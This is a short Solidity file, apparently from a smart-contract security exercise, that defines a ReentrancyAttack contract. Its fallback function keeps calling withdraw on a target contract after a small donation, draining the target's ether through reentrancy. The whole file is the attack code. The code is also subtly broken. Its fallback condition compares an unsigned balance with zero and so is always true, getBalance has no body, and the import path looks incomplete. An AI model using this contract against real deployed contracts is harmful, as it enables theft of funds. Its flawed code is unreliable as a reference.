// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Reentrancy";

contract ReentrancyAttack {
    Reentrancy public target;

    constructor(address payable _etherStoreAddress) {
        target = Reentrancy(_etherStoreAddress);
    }

    fallback() external payable {
        if (address(target).balance >= 0) {
            target.withdraw (1 wei);
        }
    }

    function attack() external payable {
        target.donate{value: 3 wei, gas: 40000000}(address(this));
        target.withdraw(1 wei);
    }

    function getBalance() public view returns (uint256)
}
